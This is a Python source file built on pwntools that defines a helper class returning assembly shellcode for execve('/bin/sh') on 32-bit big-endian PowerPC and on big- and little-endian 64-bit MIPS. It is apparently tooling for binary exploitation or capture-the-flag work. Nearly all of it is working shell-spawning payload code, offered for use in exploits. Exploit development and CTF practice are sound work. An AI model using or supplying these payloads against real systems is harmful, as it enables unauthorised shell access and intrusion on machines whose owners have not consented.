from pwn import *
class ESH():
	def __init__(self):
		#print("demo")
		log.info("arch is "+context.arch)
		log.info("endian is "+context.endian)
		log.info("bits is "+str(context.bits))

	def sh(self):
		if (context.arch == 'powerpc' or context.arch == 'powerpc64') and context.endian == 'big' and context.bits == 32:
			shellcode_execve='''
	        /* execve(path='/bin/sh', argv=['sh'], envp=0) */
	        lis    r9, 0x2f62
	        ori    r9, r9, 26990
            stw   r9, 48(r31)
            xor  r9, r9, r9
            lis    r9, 0x2f73
            ori   r9, r9, 26624
            stw   r9, 52(r31)
            addi  r3, r31,0x30
            stwu  r3, 0(r31)
            mr    r4, r31
            xor   r5, r5, r5
            li    r0, 0xb
            sc
			'''
			return shellcode_execve

		if context.arch == 'mips64' and context.endian == 'big' and context.bits == 64:
			shellcode_execve='''
			/* execve(path='/bin/sh', argv=['sh'], envp=0) */
			lui     $t1, 0x2f62
			ori     $t1, $t1, 0x696e
			sw      $t1, -8($sp)
			lui     $t9, 0xd08c
			ori     $t9, $t9, 0x97ff
			nor     $t1, $t9, $zero
			sw      $t1, -4($sp)
			daddiu   $sp, $sp, -8
			dadd     $a0, $sp, $zero
			lui     $t1, 0x2f62
			ori     $t1, $t1, 0x696e
			sw      $t1, -12($sp)
			lui     $t9, 0xd08c
			ori     $t9, $t9, 0x97ff
			nor     $t1, $t9, $zero
			sw      $t1, -8($sp)
			sw      $zero, -4($sp)
			daddiu   $sp, $sp, -12
			slti    $a1, $zero, -1
			sd      $a1, -8($sp)
			daddi    $sp, $sp, -8
			li      $t9, -9
			nor     $a1, $t9, $zero
			dadd     $a1, $sp, $a1
			sd      $a1, -8($sp)
			daddi    $sp, $sp, -8
			dadd     $a1, $sp, $zero
			slti    $a2, $zero, -1
			li      $v0,0x13c1
			syscall 0x40404
			'''
			return shellcode_execve

		if context.arch == 'mips64' and context.endian == 'little' and context.bits == 64:
			shellcode_execve = '''
			/* execve(path='/bin/sh', argv=['sh'], envp=0) */
			lui     $t1, 0x6e69
			ori     $t1, $t1, 0x622f
			sw      $t1, -8($sp)
			lui     $t9, 0xff97
			ori     $t9, $t9, 0x8cd0
			nor     $t1, $t9, $zero
			sw      $t1, -4($sp)
			daddiu   $sp, $sp, -8
			dadd     $a0, $sp, $zero
			lui     $t1, 0x6e69
			ori     $t1, $t1, 0x622f
			sw      $t1,-12($sp)
			lui     $t9, 0xff97
			ori     $t9, $t9, 0x8cd0
			nor     $t1, $t9, $zero
			sw      $t1, -8($sp)
			sw      $zero, -4($sp)
			daddiu   $sp, $sp, -12
			slti    $a1, $zero, -1
			sd      $a1, -8($sp)
			daddi    $sp, $sp, -8
			li      $t9, -9
			nor     $a1, $t9, $zero
			dadd     $a1, $sp, $a1
			sd      $a1, -8($sp)
			daddi    $sp, $sp, -8
			dadd     $a1, $sp, $zero
			slti    $a2, $zero, -1
			li      $v0, 0x13c1
			syscall 0x40404
			'''
			return shellcode_execve

		else:
			log.info("Please set correct assembly schema information(pwerpc or mips64(el))")
